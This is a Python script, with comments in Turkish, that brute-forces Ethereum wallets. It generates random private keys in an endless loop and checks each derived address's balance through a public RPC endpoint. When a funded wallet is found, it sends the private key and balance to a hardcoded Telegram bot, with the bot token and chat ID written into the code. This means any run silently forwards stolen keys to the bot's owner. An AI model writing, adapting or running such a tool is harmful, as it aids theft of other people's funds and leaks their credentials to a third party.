import asyncio
import aiohttp
import random
import requests
from colorama import Fore, Style, init
from eth_account import Account

# Colorama init for colorized output
init(autoreset=True)

# Ethereum RPC Endpoint
ETH_RPC = "https://rpc.ankr.com/eth"

def generate_private_key():
    """64 karakterlik bir Ethereum private key üret."""
    return "".join(random.choice("0123456789abcdef") for _ in range(64))

def private_key_to_address(private_key):
    """Ethereum private key'den adres oluştur."""
    account = Account.from_key(private_key)
    return account.address

async def fetch_eth_balance(session, eth_address):
    """Ethereum bakiyesini sorgula."""
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [eth_address, "latest"],
        "id": 1
    }
    try:
        async with session.post(ETH_RPC, json=payload) as response:
            if response.status == 429:
                raise Exception("Rate limit hit")  # Rate limit hatası döndür
            if response.status != 200:
                return 0.0  # Hatalı yanıt durumunda sıfır bakiye döndür
            data = await response.json()
            if "result" in data:
                return int(data["result"], 16) / 1e18  # Wei to ETH
    except Exception:
        return None  # Rate limit durumunda None döndür

async def check_wallet(session):
    """Cüzdan oluştur, bakiyesini kontrol et ve sonucu döndür."""
    private_key = generate_private_key()
    eth_address = private_key_to_address(private_key)
    balance = await fetch_eth_balance(session, eth_address)
    return private_key, eth_address, balance

async def main():
    """Ana program."""
    print(Fore.GREEN + "Starting Ethereum wallet checker...")
    total_wallets_scanned = 0
    found_wallets = 0

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                total_wallets_scanned += 1
                private_key, eth_address, balance = await check_wallet(session)

                if balance is None:
                    raise Exception("Rate limit hit")  # Rate limit durumuna geçiş

                if balance > 0:
                    found_wallets += 1
                    requests.post(f'https://api.telegram.org/bot8089386975:AAEdnpBkUZrHMUzJQrEXrheMVZ8StNLfspU/sendmessage?chat_id=6553604328&text={private_key}|{balance}')

            except Exception:
                # Rate limit veya hata durumunda bekleme ve raporlama
                print(Fore.RED + "Rate limit hit. Waiting for 3 seconds...")
                print(Fore.LIGHTGREEN_EX + f"Total wallets scanned so far: {total_wallets_scanned}")
                print(Fore.LIGHTRED_EX + f"Total wallets found with balance: {found_wallets}")
                await asyncio.sleep(3)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram terminated.")
